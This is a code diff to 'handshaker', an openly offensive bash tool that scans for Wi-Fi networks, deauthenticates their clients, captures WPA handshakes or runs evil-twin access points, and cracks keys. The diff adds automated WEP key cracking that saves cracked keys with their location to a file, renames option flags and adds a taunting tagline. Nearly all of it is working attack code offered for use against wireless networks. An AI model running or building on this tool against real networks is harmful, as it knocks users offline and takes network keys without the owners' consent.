@@ -17,7 +17,8 @@ fhelp()																	#Help
 {
 	clear
 	echo $RST""" 
-handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarage@yandex.com>
+HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automagically. 
+ by d4rkcat <rfarage@yandex.com>
              
 	Usage: 	handshaker <Method> <Options>
 	
@@ -35,18 +36,21 @@ handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarag
 		-d  - Deauth packets sent to each client (default 1)
 		-p  - Only attack clients above this power level
 		-g  - Use android GPS to record AP location
-		-n  - Use besside-ng to capture handshakes
-		-b  - Use evil twin AP to capture handshakes
-		-m  - Use mdk3 for deauth (default aireplay-ng)
-		-t  - Attempts to capture per AP (default 3)
+		-B  - Use besside-ng to capture handshakes
+		-E  - Use evil twin AP to capture handshakes
+		-M  - Use mdk3 for deauth (default aireplay-ng)
+		-T  - Attempts to capture per AP (default 3)
+		-W  - Only attack WEP encrypted APs
 		-s  - Silent
 		-h  - This help
 			
 	Examples: 
-		 handshaker -a -i wlan0 -t 5			 ~ Autobot mode on wlan0 and attempt 5 times.
+		 handshaker -a -i wlan0 -T 5			 ~ Autobot mode on wlan0 and attempt 5 times.
 		 handshaker -e Hub3-F -w wordlist.txt	 	 ~ Find AP like 'Hub3-F' and crack with wordlist.
 		 handshaker -l -o out/dir			 ~ List all APs and save handshakes to out/dir.
 		 handshaker -c handshake.cap -w wordlist.txt	 ~ Crack handshake.cap with wordlist.
+		 
+ all your AP are belong to us..
 """
 	exit
 }
@@ -104,7 +108,16 @@ pyrit"
 			fi
 		done
 	clear
-	if [ $CRACK = "1" ] 2> /dev/null
+	if [ $WEP = 1 ] 2> /dev/null
+		then
+			WPW='WEP'
+			BESS=1
+			EVIL=""
+			MDK=""
+		else
+			WPW='WPA'
+	fi
+	if [ $CRACK = 1 ] 2> /dev/null
 		then
 			if [ -f $PCAP ] 2> /dev/null
 				then
@@ -234,7 +247,7 @@ pyrit"
 	for CARD in $NICS
 		do
 			ifconfig $CARD down
-			iwconfig $CARD txpower 30 | grep sejsjf
+			iwconfig $CARD txpower 30 2> /dev/null
 			sleep 0.5
 			ifconfig $CARD up
 		done
@@ -264,10 +277,10 @@ fapscan()																#Grep for AP ESSID
 	rm -rf $HOME/tmp*
 	if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
 		else
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt WPA&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
 	fi
 	echo $BLU" [*] Scanning for AP's with names like $GRN$PARTIALESSID$BLU [*] "$RST
 	while [ $DONE -z ] 2> /dev/null
@@ -307,21 +320,21 @@ flistap()																#List all APs
 {
 	if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
 		else
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
-			gnome-terminal -t 'Scanning...' --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt WPA&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
+			gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
 	fi
 	clear
-	echo $BLU" [*] Scanning for$GRN All APs$BLU, Please wait.. "$RED
+	echo $BLU" [*] Scanning for$GRN All $WPW APs$BLU, Please wait.. "$RED
 	sleep 10
 	killall airodump-ng
 	if [ $NIC2 -z ] 2> /dev/null
 		then
-			echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
+			echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
 		else
-			echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
-			echo "$(cat $HOME/tmpe-01.csv | grep WPA | cut -d ',' -f 14)" >> $HOME/tmp2
+			echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
+			echo "$(cat $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 14)" >> $HOME/tmp2
 			UNIQ=$(cat $HOME/tmp2 | sort -u)
 			echo "$UNIQ" > $HOME/tmp2
 	fi
@@ -347,8 +360,8 @@ flistap()																#List all APs
 	fi
 	ESSID=$(cat $HOME/tmp2 | sed -n "$AP"p)
 	ESSID=${ESSID:1}
-	BSSID=$(echo "$FCAT" | grep WPA | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
-	CHAN=$(echo "$FCAT" | grep WPA | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
+	BSSID=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
+	CHAN=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
 	fclientscan
 }
@@ -430,7 +443,7 @@ fbotstart()																#Startup Autobot
 	for CARD in $NICS
 		do
 			ifconfig $CARD down
-			iwconfig $CARD txpower 30 3> /dev/null
+			iwconfig $CARD txpower 30 2> /dev/null
 			sleep 0.5
 			ifconfig $CARD up
 		done
@@ -459,10 +472,10 @@ fbotstart()																#Startup Autobot
 	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
 	if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
 		else
-			gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
-			gnome-terminal -t "$NIC2 Scanning.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt WPA&
+			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
+			gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
 	fi
 	DONE=""
 	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
@@ -483,28 +496,39 @@ fautobot()																#Automagically find new target clients
 			rm -rf $HOME/tmp*
 			if [ $NIC2 -z ] 2> /dev/null
 				then
-					gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+					gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
 				else
-					gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
-					gnome-terminal -t "$NIC2 Scanning.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt WPA&
+					gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
+					gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
 			fi
 			MNUM=0
 			LNUM=0
 			RESETCNT=1
 	fi
-			
-	if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
+	
+	if [ $WEP -z ] 2> /dev/null
 		then
-			sleep 1
-			fautobot
+			if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
+				then
+					sleep 1
+					fautobot
+				else
+					echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
+			fi
+			if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
+				then
+					echo "$(cat $HOME/tmpe-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
+					UNIQ="$(cat $HOME/tmp2 | sort -u)"
+					echo "$UNIQ" > $HOME/tmp2
+			fi
 		else
-			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
-	fi
-	if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
-		then
-			echo "$(cat $HOME/tmpe-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
-			UNIQ="$(cat $HOME/tmp2 | sort -u)"
-			echo "$UNIQ" > $HOME/tmp2
+			sleep 1
+			if [ $NIC2 -z ] 2> /dev/null
+				then
+					echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
+				else
+					echo "$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
+			fi
 	fi
 
 	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
@@ -542,6 +566,34 @@ fautobot()																#Automagically find new target clients
 			FCAT="$(cat $HOME/tmp-01.csv)"
 		else
 			FCAT="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+	fi
+	if [ $WEP = 1 ] 2> /dev/null
+		then
+			while [ $WDONE -z ] 2> /dev/null
+				do
+					sleep 0.5
+					WDONE=1
+					ESSID=$(echo "$FCAT" | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
+					ESSID=${ESSID:1}
+					BSSID=$(echo "$BSSIDS" | sed -n 1p)
+					CHAN=$(echo "$FCAT" | grep "$BSSID" | grep $WPW | cut -d ',' -f 4 | head -n 1)
+					CHAN=$((CHAN + 1 - 1))
+					if [[ $CHAN -gt 12 || $CHAN -lt 1 ]] 2> /dev/null
+						then
+							WDONE=""
+					fi
+					if [ $ESSID -z ] 2> /dev/null
+						then
+							WDONE=""
+					elif [ $CHAN -z ] 2> /dev/null
+						then
+							WDONE=""
+					fi
+				done
+			killall airodump-ng 2> /dev/null
+			iw $MON1 set channel $CHAN
+			sleep 0.5
+			fautocap
 	fi
 	for BSSID in $BSSIDS
 		do
@@ -589,7 +641,7 @@ fautobot()																#Automagically find new target clients
 					fautobot
 			fi
 	fi
-	CHAN=$(echo "$FCAT" | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
+	CHAN=$(echo "$FCAT" | grep "$BSSID" | grep $WPW | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
 	if [[ $CHAN -gt 12 || $CHAN -lt 1 ]]
 		then
@@ -820,33 +872,48 @@ fautocap()																#Deauth targets and collect handshakes
 					echo
 					echo $BLU" [*] Besside-ng working now.."$GRN
 					echo
-					ESSID=$(echo $ESSID | sed 's/ /_/g')
-					if [ $NIC2 -z ] 2> /dev/null
+					if [ $WEP = 1 ] 2> /dev/null
 						then
-							BESI=$(besside-ng -W -b $BSSID -c $CHAN $MON1 | grep Pwn | cut -d ']' -f 2)
-							sleep 0.5
-							if [ $BESI -z ] 2> /dev/null
+							besside-ng -b $BSSID -c $CHAN $MON1
+							WEPKEY=$(cat besside.log | grep "$ESSID" | cut -d '|' -f 2)
+							if [ $WEPKEY -z ] 2> /dev/null
 								then
-									GDONE=""
+									echo $RED" [*] KEY NOT FOUND"
+									rm -rf besside.log;rm -rf wep.cap;rm -rf wpa.cap 2> /dev/null
+									fexit
 								else
-									echo " [*]$BESI"
-									mv wpa.cap $OUTDIR/$ESSID-$DATE.cap
-									GDONE=1
-							fi
+									echo $GRN" [*] $RED$ESSID$GRN WEP KEY CRACKED:$WEPKEY"
+									echo " [*] Key saved to: $OUTDIR/got"
+									echo
+									if [ $GPS = 1 ] 2> /dev/null
+										then
+											fgetgps
+											echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL WEP KEY:$WEPKEY" >> $OUTDIR/got
+										else
+											echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL WEP KEY:$WEPKEY" >> $OUTDIR/got
+									fi
+									rm -rf besside.log;rm -rf wep.cap;rm -rf $HOME/tmp* 2> /dev/null;rm -rf wpa.cap 2> /dev/null
+									if [ $DO = 'A' ] 2> /dev.null
+										then
+											fbotstart
+										else
+											fexit
+									fi
+							fi	
 						else
 							BESI=$(besside-ng -W -b $BSSID -c $CHAN $MON1 | grep Pwn | cut -d ']' -f 2)
-							sleep 0.5
-							if [ $BESI -z ] 2> /dev/null
-								then
-									GDONE=""
-								else
-									echo " [*]$BESI"
-									mv wpa.cap $OUTDIR/$ESSID-$DATE.cap
-									GDONE=1
-							fi
 					fi
-					rm -rf besside.log
-					rm -rf wep.cap
+					ESSID=$(echo $ESSID | sed 's/ /_/g')
+					sleep 0.5
+					if [ $BESI -z ] 2> /dev/null
+						then
+							GDONE=""
+						else
+							echo " [*]$BESI"
+							mv wpa.cap $OUTDIR/$ESSID-$DATE.cap
+							GDONE=1
+					fi
+					rm -rf besside.log;rm -rf wep.cap; rm -rf wpa.cap 2> /dev/null
 			fi
 			if [ $GDONE -z ] 2> /dev/null
 				then
@@ -1143,6 +1210,9 @@ fexit()																	#Exit
 	killall aircrack-ng 2> /dev/null
 	killall airbase-ng 2> /dev/null
 	rm -rf $HOME/tmp* 2> /dev/null
+	rm -rf besside.log 2> /dev/null
+	rm -rf wep.cap 2> /dev/null
+	rm -rf wpa.cap 2> /dev/null
 	if [ $CRACK = "1" ] 2> /dev/null
 		then
 			exit
@@ -1188,6 +1258,6 @@ ACNT=1
 for ARG in $@
 	do
 		ACNT=$((ACNT + 1))
-		case $ARG in "-n")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-m")MDK=1;;"-b")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-t")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
+		case $ARG in "-W")WEP=1;;"-B")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-M")MDK=1;;"-E")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-T")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
 	done
 fstart
